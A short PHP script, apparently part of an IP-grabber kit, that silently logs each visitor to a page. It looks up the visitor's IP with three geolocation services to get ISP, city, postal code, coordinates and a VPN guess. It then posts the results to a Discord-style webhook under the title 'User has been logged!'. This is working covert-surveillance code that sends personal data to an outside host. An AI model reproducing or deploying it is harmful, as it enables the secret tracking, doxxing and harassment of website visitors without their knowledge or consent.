<?php
if ($iplog == true) {
$ip = $_SERVER['REMOTE_ADDR'];
$details = json_decode(file_get_contents("http://ipinfo.io/{$ip}/json"));
   $lolvpn = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
$vpnCon = json_decode(file_get_contents("https://json.geoiplookup.io/{$ip}"));
        if($vpnCon->connection_type==="Corporate"){
            $vpn = "Yes (Double Check: $lolvpn->isp)";
        }else{
            $vpn = "No (Double Check: $lolvpn->isp)";
        }
$host = $details->hostname; 
$oorg = $lolvpn->org;
$ip = $details->ip; 
$country = $details->country; 
$region = $details->region; 
$city = $details->city;
$loc = $details->loc;
$timezone = $lolvpn->timezone;
$org = $details->org;
$postal = $details->postal;
    $timestamp = date("c", strtotime("now"));
$json_data = json_encode([
   "content" => null, 
   "embeds" => [
         [
            "title" => "User has been logged!", 
            "description" => "
**IP Info:**
```yaml
IP: $ip
Host: $host
Orgonization: $oorg
ASN Orgonization: $org```
**Location:**
```yaml
Timezone: $timezone
Country: $country
State: $region
City: $city
Postal Code: $postal
Lon/Lat: $loc```
**VPN:**
```yaml
Is VPN: $vpn  (Possible False-Postives)```", 

"color" => hexdec($hex), 
"timestamp" => $timestamp
         ] 
      ], 
   "username" => "$name - IP Logs", 
   "avatar_url" => $thumbnail
], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );


$ch = curl_init( $iplogshook );
curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
curl_setopt( $ch, CURLOPT_POST, 1);
curl_setopt( $ch, CURLOPT_POSTFIELDS, $json_data);
curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt( $ch, CURLOPT_HEADER, 0);
curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);
$exec = curl_exec( $ch );
curl_close( $ch );
}
?>